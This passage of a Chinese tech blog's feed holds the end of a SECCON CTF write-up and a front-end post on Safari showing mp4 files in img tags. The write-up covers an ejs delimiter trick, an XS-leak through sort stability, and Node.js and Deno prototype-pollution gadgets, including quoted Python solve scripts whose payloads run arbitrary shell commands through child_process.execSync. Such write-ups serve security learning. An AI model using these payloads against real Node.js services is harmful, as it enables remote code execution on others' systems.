class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>輸出會是：</p><pre class="line-numbers language-none"><code class="language-none">&#123; helllo: &#39;world&#39; &#125;   &#123;    src &#x3D; src + &quot;\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\n&quot;;  &#125;  &#x2F;&#x2F; other codes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之所以會這樣，是因為把 delimiter 改掉以後，上面那段文字就等同於是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此就等同於是執行了 <code>console.log(src)</code>，所以 src 就會出現在輸出裡面。</p><h3><span id="node-ppjail-5-solves">node-ppjail (5 solves)</span></h3><p>這題可以讓你污染 prototype 上面的東西，而且值可以是 function，但問題是不能污染已經有的屬性。</p><p>解法是觸發錯誤之後，去找 Node.js 底層會幹嘛，然後污染相對應的屬性。</p><p>一個簡單的範例是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>Object<span class="token punctuation">.</span>toString<span class="token punctuation">.</span>arguments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>輸出為：</p><pre class="line-numbers language-none"><code class="language-none">pwn&#x2F;js&#x2F;pp.js:4Object.toString.arguments                ^[TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them]Node.js v20.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至於要怎麼找出這屬性，學 <a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox">maple</a> 去 patch V8 似乎是個不錯的選擇。</p><p>而作者則是有找到另外兩種方法，在這邊留個紀錄以後比較好找，來源是<a href="https://blog.arkark.dev/2023/09/21/seccon-quals/">作者的 writeup</a>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 1:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77</span>            <span class="token string">"1"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"callback"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 2:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064</span>            <span class="token string">"circular"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"get"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token comment"># ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause</span>            <span class="token string">"cause"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token comment"># Cause an error</span>        <span class="token string">"toString"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"caller"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="deno-ppjail-2-solves">deno-ppjail (2 solves)</span></h3><p>跟上一題類似，但是是要找 deno 的 gadget。</p><p>作者找到的 gadget 是 <code>Object.prototype.return</code></p><p>而 maple 找到的是 cause + circular.get，@parrot409 找到的是 <code>nodeProcessUnhandledRejectionCallback</code></p><p>更詳細的說明可以參考 maple 的 writeup：<a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail">https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail</a></p><h3><span id="hidden-note-1-solve">hidden-note (1 solve)</span></h3><p>這題也很有趣，題目就是經典的那種 XS leaks 的類型，有搜尋功能，只是搜尋結果會把 flag 給 filter 掉。</p><p>搜尋結果的頁面可以用 meta redirect 洩漏出來，所以是可以看到結果頁面的。只是結果頁面已經把 flag 去掉了，那還可以做些什麼呢？</p><p>在搜尋的時候，會把結果先排序，排序完以後再把 flag 去掉，而這一題所使用的排序方法在元素 &lt;&#x3D; 12 個的時候會是 stable sort，&gt;12 個就是 unstable sort。</p><p>因此，我們可以先建立恰好 12 個 note，內容為：<code>ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|...</code></p><p>假如 flag 是 <code>SECCON&#123;abc&#125;</code> 好了，在搜尋 <code>ECCON&#123;@</code> 時，因為總數是 12 個，所以是 stable sort，最後搜尋結果頁面的 id 順序不會變。</p><p>但如果是搜尋 <code>ECCON&#123;a</code>，結果就變成 13 個，此時變成 unstable sort，note 的順序變了。</p><p>因此，可以從結果頁面的內容知道原始搜尋的結果是 12 個以內還是超過 12 個，就可以把這個當作 oracle，進而 leak 出 flag。</p><p>這個解法真的很酷，非常新穎！無論是出題的 Ark 還是解開的 maple，都真的好強</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。&lt;/p&gt;
&lt;p&gt;關鍵字列表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;nim json, null byte&lt;/li&gt;
&lt;li&gt;nim request smuggling&lt;/li&gt;
&lt;li&gt;js-yaml&lt;/li&gt;
&lt;li&gt;web worker&lt;/li&gt;
&lt;li&gt;blob URL&lt;/li&gt;
&lt;li&gt;meta redirect&lt;/li&gt;
&lt;li&gt;file protocol &amp;amp; .localhost domain&lt;/li&gt;
&lt;li&gt;sxg: Signed Exchanges&lt;/li&gt;
&lt;li&gt;431 CSP bypass&lt;/li&gt;
&lt;li&gt;DOM clobbering document.body&lt;/li&gt;
&lt;li&gt;ejs delimiter&lt;/li&gt;
&lt;li&gt;Node.js + Deno prototye pollution gadget&lt;/li&gt;
&lt;li&gt;XSleaks golang sort&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>原來 img src 也支援 mp4（Safari 限定）</title>
    <link href="https://blog.huli.tw/2023/09/11/mp4-in-img-src/"/>
    <id>https://blog.huli.tw/2023/09/11/mp4-in-img-src/</id>
    <published>2023-09-11T13:10:00.000Z</published>
    <updated>2023-09-11T13:29:47.865Z</updated>
    
    <content type="html"><![CDATA[<p>有些網站會用 GIF 來做一些圖檔，畢竟會動嘛，看起來就比一些靜態的圖片還要厲害，還要來得更吸引人。或其實不只是因為吸引人，而是有些需求本來就需要一個會動的圖，例如說貼圖，會動是很正常的。</p><p>但是 GIF 的缺點之一眾所皆知，就是檔案很大，真的很大。尤其是手機上因為解析度比較高，可能會需要用到三倍大小的圖片，就算只顯示 52 px，也要準備 156px 的圖檔，佔的空間就更多了。以網頁來說，當然是要載入的資源越少越好，越小也越好。</p><span id="more"></span><p>因此，很多網站會改用 <code>&lt;video&gt;</code> 標籤來呈現這些動圖，只要先轉成 mp4 格式，檔案大小就能小很多。不過轉成 <code>&lt;video&gt;</code> 的問題大概就是原先用 <code>&lt;img&gt;</code> 的一些好處會不見，像是 lazy loading 似乎就沒有原生支援，有一些麻煩。</p><p>而我在查資料的過程中，居然意外發現在 Safari 上面，<code>&lt;img&gt;</code> 是支援 mp4 的！也就是說，你可以這樣做：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而且這個功能推出很久了，從 2017 的時候就有了：<a href="https://bugs.webkit.org/show_bug.cgi?id=176825">Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation</a></p><p>我是從這篇文章知道的：<a href="https://calendar.perfplanet.com/2017/animated-gif-without-the-gif/">Evolution of &lt;img&gt;: Gif without the GIF</a></p><p>如果 <code>&lt;img&gt;</code> 裡面也可以放 mp4 的話，就可以同時利用到兩者的優點，又不用換標籤，又支援 lazy loading，然後檔案大小又一下縮減了許多。</p><p>但可惜的事情是，只有 Safari 有支援而已，就算過了六年，在 Chromium 以及 Firefox 上都沒看到這個功能，而且未來也沒什麼機會看到了。</p><p>之所以會這樣講，是因為 Chromium 已經明確表示不會支援，討論串在這邊：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791658">Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt;</a> ，在 2018 的時候就已經被標記為 Wont fix，理由如下：</p><pre class="line-numbers language-none"><code class="language-none">Closing as WontFix per c#35, due to the following:- The widespread adoption of WebP (addresses CDN use case)- Forthcoming AV1 based image formats (ditto).- Memory inefficiency with allowing arbitrary video in image.- Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一點提到的是 WebP 其實也有個 Animated WebP 的格式，可以放在 <code>&lt;img src&gt;</code> 裡面而且也會動，檔案大小更小，其他優缺點可以參考 Google 自己寫的：<a href="https://developers.google.com/speed/webp/faq?hl=zh-tw#why_should_i_use_animated_webp">使用 WebP 動畫有什麼好處？</a></p><p>而第二點是在說比較新的圖片格式 AVIF 也有 Animated AVIF，同樣也支援動圖。</p><p>如果這些新的圖片格式都可以取代 GIF 的話，好像確實沒什麼必要一定要使用 mp4？</p><p>而 Firefox 的話雖然沒有說不會做，但是 issue 也已經很久沒動了：<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=895131">Add support for video formats in &lt;img&gt;, behaving like animated gif</a></p><p>也有人希望可以把這個功能加入規格，但也有一陣子沒有動靜：<a href="https://github.com/whatwg/html/issues/7141">Require img to be able to load the same video formats as video supports #7141</a></p><p>總而言之，看起來這個功能應該只會在 Safari 上面有了。</p><p>可惜我在用的 image service 的自動轉檔功能只支援 GIF 轉 mp4，不支援轉成 animated WebP 或是 animated AVIF，不然就超方便的。</p><h2><span id="總結">總結</span></h2><p>如果想要繼續用 <code>&lt;img&gt;</code> 來放動圖的話，最完整的方式應該是使用 <code>&lt;picture&gt;</code> 標籤搭配多種檔案格式，像這樣：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/avif<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.avif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/webp<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.webp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.gif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣就可以確保在每個瀏覽器上面都可以呈現出結果，並且會選擇通常檔案大小較小的圖片。</p><p>我隨便試了一下，自己錄了一個簡單的 gif，原始大小是 75 KB：</p><p><img src="/img/mp4-in-img-src/test.gif" alt="gif"></p><p>轉成 WebP 之後是 58 KB (-22.6%)：</p><p><img src="/img/mp4-in-img-src/test.webp" alt="webp"></p><p>轉成 mp4 是 17 KB（-77.3%）：</p><p><img src="/img/mp4-in-img-src/test.mp4" alt="只有 Safari 支援 mp4，看不到正常"></p><p>轉成 AVIF 是 11 KB（-85.3%）：</p><p><img src="/img/mp4-in-img-src/test.avif" alt="AVIF 格式，有可能較新還不支援"></p><p>看來最新的檔案格式還是滿厲害的，一下就小了超多。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有些網站會用 GIF 來做一些圖檔，畢竟會動嘛，看起來就比一些靜態的圖片還要厲害，還要來得更吸引人。或其實不只是因為吸引人，而是有些需求本來就需要一個會動的圖，例如說貼圖，會動是很正常的。&lt;/p&gt;
&lt;p&gt;但是 GIF 的缺點之一眾所皆知，就是檔案很大，真的很大。尤其是手機上因為解析度比較高，可能會需要用到三倍大小的圖片，就算只顯示 52 px，也要準備 156px 的圖檔，佔的空間就更多了。以網頁來說，當然是要載入的資源越少越好，越小也越好。&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
</feed>
